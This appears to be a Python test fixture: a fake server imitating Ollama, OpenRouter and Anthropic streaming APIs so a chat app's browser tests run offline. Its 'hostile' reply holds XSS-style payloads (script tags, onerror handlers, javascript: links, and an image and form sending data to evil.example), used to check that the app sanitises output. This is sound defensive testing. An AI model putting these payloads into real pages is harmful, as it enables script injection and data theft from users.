#!/usr/bin/env python3
"""A stand-in for Ollama, OpenRouter and Anthropic that streams scripted replies.

Browser tests run the real app against this, so they are fast, free and repeatable. What the reply
does is chosen by a keyword in the user's last message:

    slow       about 4 seconds of steady tokens (for Stop)
    endless    two minutes of steady tokens (for stopping the service mid-reply)
    markdown   a long reply with a code block, a list and a table
    hostile    markdown full of script, style, remote images and javascript: links
    error      two tokens, then the provider fails mid-stream
    ratelimit  an HTTP 429 before anything streams
    long       about 3,000 tokens as fast as possible (for render cost)
    anything else gets a short echo; if reasoning was requested, thinking comes first

GET /__requests lists what the app sent (path, JSON body, whether a key header was present).
Usage: fake_providers.py PORT
"""

import json
import re
import sys
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

FIXTURES = Path(__file__).resolve().parents[1] / "fixtures"
OLLAMA = json.loads((FIXTURES / "ollama_models.json").read_text())
OPENROUTER = json.loads((FIXTURES / "openrouter_models.json").read_text())
SEEN: list[dict] = []

MARKDOWN = """Here is the plan.

```python
def total(items):
    return sum(i.price * i.qty for i in items)
```

1. Parse the input.
2. Validate the totals.
3. **Report** the result.

| Step | Cost |
|---|---|
| parse | low |
| validate | medium |

Done.
"""

HOSTILE = """Here is a summary.

<script>document.title = "pwned"</script>

<style>body { display: none }</style>

<img src="https://evil.example/leak?c=secret" onerror="document.title='pwned'">

[click me](javascript:document.title='pwned')

![tracking pixel](https://evil.example/pixel.png)

<a href="data:text/html,<script>alert(1)</script>">data link</a>

<iframe src="https://evil.example"></iframe>

<form action="https://evil.example"><input name="x"><button>Send</button></form>

<div class="copy" data-copy>forged copy button</div>

<p class="copy code-head" data-copy id="app" onclick="document.title='pwned'">a paragraph pretending to be a control</p>

<a class="copy" href="https://example.com/" data-copy>a link pretending to be a control</a>

A normal [link](https://example.com) and `inline code` still work.
"""


def tokens(text: str) -> list[str]:
    return re.findall(r"\S+\s*|\s+", text)


def plan(prompt: str, reasoning: bool) -> dict:
    p = prompt.lower()
    plan = {
        "thinking": [],
        "content": tokens(f"Hello from the fake model. You said: {prompt}"),
        "error": None,
        "delay": 0.004,
    }
    if "hostile" in p:
        plan["content"] = tokens(HOSTILE)
    elif "markdown" in p:
        plan["content"], plan["delay"] = tokens(MARKDOWN), 0.01
    elif "slow" in p:
        plan["content"], plan["delay"] = (
            tokens("one two three four five six seven eight nine ten " * 4),
            0.1,
        )
    elif "endless" in p:
        plan["content"], plan["delay"] = tokens("word " * 2000), 0.1
    elif "long" in p:
        plan["content"], plan["delay"] = (
            tokens("This sentence repeats to make a long reply. " * 400),
            0,
        )
    elif "error" in p:
        plan["content"], plan["error"] = (
            ["Partial ", "reply "],
            "llama runner process has terminated",
        )
    if reasoning:
        plan["thinking"] = tokens(
            "Let me think about this carefully before answering. " * 2
        )
    return plan


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.0"  # streams end by closing the connection

    def log_message(self, *args):  # silence
        pass

    def send_json(self, status: int, data) -> None:
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def start_stream(self, content_type: str) -> None:
        self.send_response(200)
        self.send_header("content-type", content_type)
        self.send_header("cache-control", "no-store")
        self.end_headers()

    def emit(self, text: str) -> bool:
        try:
            self.wfile.write(text.encode())
            self.wfile.flush()
            return True
        except (BrokenPipeError, ConnectionResetError):
            return False

    def do_GET(self):
        if self.path == "/api/tags":
            self.send_json(200, {"models": OLLAMA["tags"]})
        elif self.path == "/api/v1/models":
            self.send_json(200, {"data": OPENROUTER})
        elif self.path == "/__requests":
            self.send_json(200, SEEN)
        else:
            self.send_json(404, {"error": "not found"})

    def do_POST(self):
        body = json.loads(
            self.rfile.read(int(self.headers.get("content-length", 0))) or b"{}"
        )
        if self.path == "/api/show":
            self.send_json(200, OLLAMA["show"][body["model"]])
            return
        SEEN.append(
            {
                "path": self.path,
                "body": body,
                "has_key": bool(
                    self.headers.get("authorization") or self.headers.get("x-api-key")
                ),
            }
        )
        last = next(
            (
                m["content"]
                for m in reversed(body.get("messages", []))
                if m["role"] == "user"
            ),
            "",
        )
        if "ratelimit" in last.lower() and self.path != "/api/chat":
            self.send_json(
                429,
                {
                    "error": {
                        "code": 429,
                        "message": "Rate limit exceeded: free-models-per-day",
                    }
                },
            )
            return
        if self.path == "/api/chat":
            self.ollama(body, last)
        elif self.path == "/api/v1/chat/completions":
            self.openrouter(body, last)
        elif self.path == "/v1/messages":
            self.anthropic(body, last)
        else:
            self.send_json(404, {"error": "not found"})

    def ollama(self, body, last):
        think = body.get("think")
        script = plan(last, bool(think))
        self.start_stream("application/x-ndjson")
        for tok in script["thinking"]:
            if not self.emit(
                json.dumps(
                    {
                        "message": {
                            "role": "assistant",
                            "content": "",
                            "thinking": tok,
                        },
                        "done": False,
                    }
                )
                + "\n"
            ):
                return
            time.sleep(script["delay"])
        for tok in script["content"]:
            if not self.emit(
                json.dumps(
                    {"message": {"role": "assistant", "content": tok}, "done": False}
                )
                + "\n"
            ):
                return
            time.sleep(script["delay"])
        if script["error"]:
            self.emit(json.dumps({"error": script["error"]}) + "\n")
            return
        count = len(script["content"]) + len(script["thinking"])
        self.emit(
            json.dumps(
                {
                    "message": {"role": "assistant", "content": ""},
                    "done": True,
                    "done_reason": "stop",
                    "prompt_eval_count": 20,
                    "eval_count": count,
                    "eval_duration": int(max(count, 1) * 20_000_000),
                }
            )
            + "\n"
        )

    def openrouter(self, body, last):
        script = plan(last, "reasoning" in body)
        self.start_stream("text/event-stream")
        self.emit(": OPENROUTER PROCESSING\n\n")

        def chunk(delta, extra=None):
            return (
                "data: "
                + json.dumps(
                    {
                        "id": "gen-fake",
                        "choices": [{"index": 0, "delta": delta, **(extra or {})}],
                    }
                )
                + "\n\n"
            )

        for tok in script["thinking"]:
            if not self.emit(
                chunk({"role": "assistant", "content": "", "reasoning": tok})
            ):
                return
            time.sleep(script["delay"])
        for tok in script["content"]:
            if not self.emit(chunk({"content": tok})):
                return
            time.sleep(script["delay"])
        if script["error"]:
            self.emit(
                "data: "
                + json.dumps(
                    {
                        "error": {"code": "server_error", "message": script["error"]},
                        "choices": [
                            {
                                "index": 0,
                                "delta": {"content": ""},
                                "finish_reason": "error",
                            }
                        ],
                    }
                )
                + "\n\n"
            )
            return
        count = len(script["content"])
        self.emit(
            "data: "
            + json.dumps(
                {
                    "choices": [
                        {"index": 0, "delta": {"content": ""}, "finish_reason": "stop"}
                    ],
                    "usage": {
                        "prompt_tokens": 20,
                        "completion_tokens": count,
                        "cost": 0.0001,
                    },
                }
            )
            + "\n\n"
        )
        self.emit("data: [DONE]\n\n")

    def anthropic(self, body, last):
        thinking = body.get("thinking", {})
        script = plan(last, thinking.get("type") == "adaptive")

        def event(name, data):
            return f"event: {name}\ndata: {json.dumps(data)}\n\n"

        self.start_stream("text/event-stream")
        self.emit(
            event(
                "message_start",
                {
                    "type": "message_start",
                    "message": {
                        "id": "msg_fake",
                        "role": "assistant",
                        "content": [],
                        "usage": {"input_tokens": 20, "output_tokens": 1},
                    },
                },
            )
        )
        index = 0
        if script["thinking"]:
            self.emit(
                event(
                    "content_block_start",
                    {
                        "type": "content_block_start",
                        "index": index,
                        "content_block": {"type": "thinking", "thinking": ""},
                    },
                )
            )
            for tok in script["thinking"]:
                if not self.emit(
                    event(
                        "content_block_delta",
                        {
                            "type": "content_block_delta",
                            "index": index,
                            "delta": {"type": "thinking_delta", "thinking": tok},
                        },
                    )
                ):
                    return
                time.sleep(script["delay"])
            self.emit(
                event(
                    "content_block_stop", {"type": "content_block_stop", "index": index}
                )
            )
            index += 1
        self.emit(
            event(
                "content_block_start",
                {
                    "type": "content_block_start",
                    "index": index,
                    "content_block": {"type": "text", "text": ""},
                },
            )
        )
        for tok in script["content"]:
            if not self.emit(
                event(
                    "content_block_delta",
                    {
                        "type": "content_block_delta",
                        "index": index,
                        "delta": {"type": "text_delta", "text": tok},
                    },
                )
            ):
                return
            time.sleep(script["delay"])
        if script["error"]:
            self.emit(
                event(
                    "error",
                    {
                        "type": "error",
                        "error": {
                            "type": "overloaded_error",
                            "message": script["error"],
                        },
                    },
                )
            )
            return
        self.emit(
            event("content_block_stop", {"type": "content_block_stop", "index": index})
        )
        self.emit(
            event(
                "message_delta",
                {
                    "type": "message_delta",
                    "delta": {"stop_reason": "end_turn"},
                    "usage": {"output_tokens": len(script["content"])},
                },
            )
        )
        self.emit(event("message_stop", {"type": "message_stop"}))


if __name__ == "__main__":
    server = ThreadingHTTPServer(("127.0.0.1", int(sys.argv[1])), Handler)
    server.daemon_threads = True
    server.serve_forever()
